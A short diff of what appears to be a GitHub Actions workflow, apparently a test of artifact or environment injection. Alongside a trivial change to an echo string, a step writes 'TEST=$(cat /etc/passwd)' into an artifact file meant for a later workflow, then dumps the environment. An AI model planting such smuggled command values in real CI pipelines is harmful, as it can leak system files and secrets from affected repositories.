@@ -13,7 +13,7 @@ jobs:
           echo -e '${{ github.event.number }}\nTEST=$(cat /etc/passwd)' > ./pr/NR
           cat ./pr/NR
           env
-          echo testtt333
+          echo testtt3334
 
       - uses: actions/upload-artifact@v2
         with:
